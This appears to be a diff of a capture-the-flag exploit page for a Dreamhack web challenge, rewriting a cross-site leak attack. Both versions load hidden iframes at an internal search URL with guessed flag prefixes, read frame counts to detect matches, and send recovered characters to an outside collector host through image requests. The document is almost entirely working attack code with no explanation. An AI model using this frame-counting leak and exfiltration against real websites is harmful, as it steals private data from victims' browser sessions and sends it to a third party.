@@ -1,44 +1,31 @@
-<iframe id="iframe"></iframe>
-<img id="img">
+<!doctype html>
+<meta charset="utf-8">
 <script>
-    async function req(url) {
-        return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframe");
-            iframe.src = url;
-            iframe.onload = () => { 
-                if (iframe.contentWindow.frames.length != 0)
-                    return resolve();
-                else
-                    return reject();
-            };
-        });
-    }
+const collect = "https://mfkmfpn.request.dreamhack.games/";
+const internal = "http://host3.dreamhack.games:11675/search?query=";
+const prefix = new URLSearchParams(location.search).get("p") || "DH{";
+const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}";
+let sent = false;
 
-    async function search(query) {
-        try {
-            await req(
-              `http://host3.dreamhack.games:11675/search?query=${query}`
-            );
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
+function report(value) {
+  if (sent) return;
+  sent = true;
+  new Image().src = collect + "?found=" + encodeURIComponent(value);
+}
 
-    async function exploit() {
-        let chars = "0123456789abcdef}"
-        let secret = "DH{";
+function probe(frame) {
+  let ok = false;
+  try {
+    ok = frame.contentWindow.length > 0;
+  } catch (e) {}
+  if (ok) report(prefix + frame.dataset.c);
+}
 
-        while (!secret.includes("}")) {
-            for (let c of chars) {
-                if (await search(secret + c)) {
-                    secret += c;
-                    img.src = `https://yauojhi.request.dreamhack.games/${secret}`;
-                    break;
-                }
-            }
-        }
-    }
-
-    exploit();
+for (const c of chars) {
+  const frame = document.createElement("iframe");
+  frame.dataset.c = c;
+  frame.onload = () => probe(frame);
+  frame.src = internal + encodeURIComponent(prefix + c);
+  document.body.appendChild(frame);
+}
 </script>
